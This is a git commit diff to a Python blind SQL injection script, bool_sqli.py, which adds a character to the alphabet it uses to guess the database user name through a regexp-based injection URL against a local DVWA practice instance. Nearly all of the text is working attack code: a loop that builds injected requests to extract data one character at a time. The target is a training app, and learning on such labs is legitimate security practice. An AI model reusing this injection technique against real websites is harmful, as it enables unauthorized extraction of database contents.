47f5e68ba8fae8b9890feb66a4128e10fd4a2028
Jumbo <jumbo.wjb@hackermail.com>
2019-02-28 20:35:38 +0800

    Update bool_sqli.py

--- bool_sqli.py
+++ bool_sqli.py
@@ -4,7 +4,7 @@ import requests
 def GetQ():
     reuslt = []
     pd = ''
-    payload = '0123456789abcdefghijklmnopqrstuvwxyz!_@%'
+    payload = '0123456789abcdefghijklmnopqrstuvwxyz!_@%.'
     for i in range(30):
         for p in payload:
             url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20and%20user()%20regexp%20%27^{}%27 and 'a'like'a&Submit=Submit#".format(pd+p)
